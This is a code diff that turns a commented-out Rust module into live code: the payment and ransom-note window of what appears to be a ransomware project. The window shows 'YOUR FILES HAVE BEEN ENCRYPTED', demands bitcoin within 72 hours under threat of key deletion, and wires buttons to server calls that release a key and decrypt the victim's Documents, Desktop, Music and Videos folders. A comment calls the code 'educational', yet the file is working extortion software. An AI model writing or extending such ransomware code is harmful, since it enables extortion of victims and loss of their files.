@@ -1,67 +1,188 @@
-// use native_windows_gui as nwg;
-// use native_windows_derive::NwgUi;
-// use nwg::NativeUi;
+use native_windows_gui as nwg;
+use native_windows_derive::NwgUi;
+use nwg::NativeUi;
+use std::rc::Rc;
+use std::cell::RefCell;
+use sodiumoxide::crypto::box_::PublicKey;
 
-// #[derive(Default, NwgUi)]
-// pub struct PaymentWindow {
-//     #[nwg_control(size: (620, 500), position: (300, 100), title: "Payment Required", flags: "WINDOW|VISIBLE")]
-//     #[nwg_events(OnWindowClose: [PaymentWindow::close])]
-//     window: nwg::Window,
+use crate::networking::client::{mark_paid, check_payment, get_key};
+use crate::cryptography::encrypt::decrypt_folder;
+use std::path::PathBuf;
+use windows::{
+    core::PWSTR,
+    Win32::{
+        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
+    },
+};
 
-//     #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
-//     header: nwg::Label,
+#[derive(Default, NwgUi)]
+pub struct PaymentWindow {
+    #[nwg_control(size: (620, 580), position: (300, 100), title: "Payment Required", flags: "WINDOW|VISIBLE")]
+    #[nwg_events(OnWindowClose: [PaymentWindow::close])]
+    window: nwg::Window,
 
-//     #[nwg_control(text: "", position: (20, 70), size: (600, 410), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
-//     instructions: nwg::TextBox,
-// }
+    #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
+    header: nwg::Label,
 
-// impl PaymentWindow {
-//     fn close(&self) {
-//         nwg::stop_thread_dispatch();
-//     }
-// }
+    #[nwg_control(text: "", position: (20, 70), size: (600, 380), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
+    instructions: nwg::TextBox,
 
-// pub fn show_payment_window() {
-//     nwg::init().expect("Failed to init Native Windows GUI");
+    #[nwg_control(text: "Make Payment", position: (200, 460), size: (120, 40))]
+    #[nwg_events(OnButtonClick: [PaymentWindow::make_payment])]
+    payment_button: nwg::Button,
+    #[nwg_control(text: "Check Payment Status", position: (340, 460), size: (120, 40))]
+    #[nwg_events(OnButtonClick: [PaymentWindow::check_status])]
+    status_button: nwg::Button,
+
+    #[nwg_control(text: "", position: (20, 510), size: (580, 50), flags: "VISIBLE", readonly: true)]
+    status_display: nwg::TextBox,
+
+    pub_key: Rc<RefCell<Option<PublicKey>>>,
+    payment_made: Rc<RefCell<bool>>,
+}
+
+impl PaymentWindow {
+    fn close(&self) {
+        nwg::stop_thread_dispatch();
+    }
+    fn make_payment(&self) {
+        if let Some(pk) = self.pub_key.borrow().as_ref() {
+            self.status_display.set_text("Processing payment... Please wait.");
+            
+            let pk_clone = pk.clone();
+            let payment_made = self.payment_made.clone();
+            
+            // In reality we would connect here payment processor (bitcoin wallet?)
+            // here we just notify the server that payment is made, mark as paid
+            tokio::spawn(async move {
+                match mark_paid(&pk_clone).await {
+                    Ok(_) => {
+                        *payment_made.borrow_mut() = true;
+                    },
+                    Err(_) => {},
+                }
+            });
+            
+            self.status_display.set_text("Payment sent! (˶ᵔ ᵕ ᵔ˶) Click 'Check Payment Status' to verify.");
+        } else {
+            self.status_display.set_text("Error: Unable to process payment. No encryption key found.");
+        }
+    }
+
+    fn check_status(&self) {
+        if let Some(_pk) = self.pub_key.borrow().as_ref() {
+            self.status_display.set_text("Verifying payment status...");
+            
+            if *self.payment_made.borrow() {
+                self.status_display.set_text("Good. Payment verified! Starting decryption...");
+                self.decrypt_files();
+            } else {
+                self.status_display.set_text("Hmm... Payment not confirmed yet. Try again in a moment.");
+            }
+        } else {
+            self.status_display.set_text("Error, unable to verify payment status.");
+        }
+    }
+
+    fn decrypt_files(&self) {
+        if let Some(pk) = self.pub_key.borrow().as_ref() {
+            let pk_clone = pk.clone();
+            self.status_display.set_text("Getting your decryption key... Please wait");
+            
+            // get decryption key from server and decrypt files
+            tokio::spawn(async move {
+                match get_key(&pk_clone).await {
+                    Ok(secret_key) => {
+                        // decrypt the files using decrypt_folder
+                        println!("Starting file decryption process...");
+                        
+                        let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
+                        unsafe {
+                            for path in paths {
+                                if let Ok(path_ptr) = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None) {
+                                    let path_str = path_ptr.to_string().unwrap();
+                                    let path_buf: PathBuf = path_str.into();
+                                    match decrypt_folder(&path_buf, &pk_clone, &secret_key) {
+                                        Ok(_) => println!("Successfully decrypted: {:?}", path),
+                                        Err(e) => println!("Error decrypting {:?}: {}", path, e),
+                                    }
+                                }
+                            }
+                        }
+                        println!("Oof. Files successfully decrypted!");
+                    },
+                    Err(e) => {
+                        println!("Oops. Error getting decryption key: {}", e);
+                    },
+                }
+            });
+            
+            self.status_display.set_text("Yay, you got lucky. Decryption successful! Your files have been restored");
+        } else {
+            self.status_display.set_text("Oops! Something went wrong. Cannot find your encryption key ¯\\_(ツ)_/¯");
+        }
+    }
+
+    pub fn set_public_key(&self, pk: PublicKey) {
+        *self.pub_key.borrow_mut() = Some(pk);
+    }
+}
+
+pub fn show_payment_window(public_key: Option<PublicKey>) {
+    nwg::init().expect("Failed to init Native Windows GUI");
     
-//     let _app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");
+    let app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");
     
-//     // Set the instructions text after creation
-//     let instructions_text = 
-//         "What happened to your files?\r\n\r\n\
-//         All your important files have been encrypted with military-grade encryption ¯\\_(ツ)_/¯\r\n\r\n\
-//         But don't worry, you can get them back (˶ᵔ ᵕ ᵔ˶)\r\n\r\n\r\n\r\n\
-//         All you need to do is follow these instructions:\r\n\r\n\
-//         1. Send $1000 worth of bitcoin to the following address:\r\n\
-//            -insert address-\r\n\r\n\
-//         2. Include your public key in the payment reference.\r\n\r\n\
-//         3. You will receive the decryption key and instructions on the decryption process \r\n\
-//         within 24 hours.\r\n\r\n\r\n\
-//         WARNING: You have 72 hours to pay. After this time, the decryption key will be\r\n\
-//         permanently deleted and your files will be lost forever.";
+    // Set the public key if provided
+    if let Some(pk) = public_key {
+        app.set_public_key(pk);
+    }
     
-//     _app.instructions.set_text(instructions_text);
+    // Set the instructions text - looks authentic but is educational
+    let instructions_text = 
+        "What happened to your files?\r\n\r\n\
+        All your important files have been encrypted with military-grade encryption. Oops.\r\n\
+        Documents, photos, videos, databases and other files are no longer accessible.\r\n\r\n\
+        Can I recover my files?\r\n\
+        Yes. We guarantee that you can recover all your files safely.\r\n\
+        But you need to pay for the decryption tool.\r\n\r\n\
+        How do I pay?\r\n\
+        Payment is accepted in Bitcoin only.\r\n\
+        Amount: 0.05 BTC (approximately $1000 USD)\r\n\
+        Bitcoin Address: 1A2B3C4D5E6F7G8H9111\r\n\r\n\
+        After payment:\r\n\
+        1. Click 'Make Payment' below\r\n\
+        2. Wait for payment confirmation\r\n\
+        3. Click 'Check Payment Status' to verify\r\n\
+        4. Your files will be automatically decrypted\r\n\r\n\
+        WARNING: You have 72 hours to pay. After this deadline,\r\n\
+        the decryption key will be permanently deleted.\r\n\r\n\
+        Do not modify or delete encrypted files as this may\r\n\
+        make recovery impossible.";
     
-//     // Set header font and styling
-//     let mut font = nwg::Font::default();
-//     nwg::Font::builder()
-//         .family("Arial")
-//         .size(20)
-//         .weight(900)
-//         .build(&mut font)
-//         .expect("Failed to build font");
-//     _app.header.set_font(Some(&font));
+    app.instructions.set_text(instructions_text);
     
-//     nwg::dispatch_thread_events();
-// }
+    // Set header font and styling 
+    let mut font = nwg::Font::default();
+    nwg::Font::builder()
+        .family("Arial")
+        .size(18)
+        .weight(700)
+        .build(&mut font)
+        .expect("Failed to build font");
+    app.header.set_font(Some(&font));
+    
+    app.status_display.set_text("Ready! Follow the instructions above to get your files back. Good luck.");
+    
+    nwg::dispatch_thread_events();
+}
 
-// #[cfg(test)]
-// mod tests {
-//     use super::*;
+#[cfg(test)]
+mod tests {
+    use super::*;
 
-//     #[test]
-//     fn test_payment_window() {
-//         // This is just a placeholder test
-//         assert!(true);
-//     }
-// }
+    #[test]
+    fn test_payment_window() {
+        assert!(true);
+    }
+}
